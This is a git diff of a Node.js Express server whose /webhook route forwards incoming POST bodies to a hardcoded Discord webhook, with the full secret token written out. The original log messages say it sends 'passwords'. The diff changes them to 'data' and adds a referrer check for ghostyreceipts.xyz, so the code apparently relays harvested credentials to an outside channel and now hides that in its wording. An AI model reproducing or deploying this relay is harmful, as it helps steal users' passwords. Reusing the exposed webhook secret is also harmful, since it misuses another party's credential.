@@ -1,7 +1,7 @@
-import express from 'express'; // Use default import for express
-import fetch from 'node-fetch'; // For Node.js 18.x and newer (ES Modules)
-import cors from 'cors'; // Use default import for cors
-import bodyParser from 'body-parser'; // Use default import for body-parser
+import express from 'express';
+import fetch from 'node-fetch';
+import cors from 'cors';
+import bodyParser from 'body-parser';
 
 const app = express();
 
@@ -11,10 +11,16 @@ app.use(cors());
 // Parse JSON bodies
 app.use(bodyParser.json());
 
-// This is the route that will handle the POST request to /webhook
+// Webhook Route with Referrer Check
 app.post('/webhook', (req, res) => {
-    const webhookData = req.body; // Use const for the incoming webhook data
-    const webhookUrl = 'https://discord.com/api/webhooks/1339836003552071720/zP_2Iu8Nk7AIdo5LlCJSkMDCnsig8GNiUXy3KFF-tMXUNdALCVxIAjz_UYjN-tMpI1eq';  // Replace this with your actual Discord webhook URL
+    const referrer = req.get('Referrer');  // Get referrer from headers
+
+    if (!referrer || !referrer.startsWith('https://ghostyreceipts.xyz')) {
+        return res.status(403).send('Forbidden'); // Reject if not from your site
+    }
+
+    const webhookData = req.body;
+    const webhookUrl = 'https://discord.com/api/webhooks/1339836003552071720/zP_2Iu8Nk7AIdo5LlCJSkMDCnsig8GNiUXy3KFF-tMXUNdALCVxIAjz_UYjN-tMpI1eq';
 
     // Send the data to the Discord webhook URL
     fetch(webhookUrl, {
@@ -26,20 +32,21 @@ app.post('/webhook', (req, res) => {
     })
     .then((response) => {
         if (response.ok) {
-            console.log('Password sent to webhook!');
-            res.status(200).send('Password sent to webhook');
+            console.log('Data sent to webhook!');
+            res.status(200).send('Data sent to webhook');
         } else {
-            console.error('Failed to send password to webhook:', response.statusText);
-            res.status(500).send('Failed to send password to webhook');
+            console.error('Failed to send data to webhook:', response.statusText);
+            res.status(500).send('Failed to send data to webhook');
         }
     })
     .catch((error) => {
-        console.error('Error sending password to webhook:', error);
-        res.status(500).send('Error sending password to webhook');
+        console.error('Error sending data to webhook:', error);
+        res.status(500).send('Error sending data to webhook');
     });
 });
 
 // Start server
-app.listen(3000, () => {
-    console.log('Server running on port 3000');
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log(`Server running on port ${PORT}`);
 });
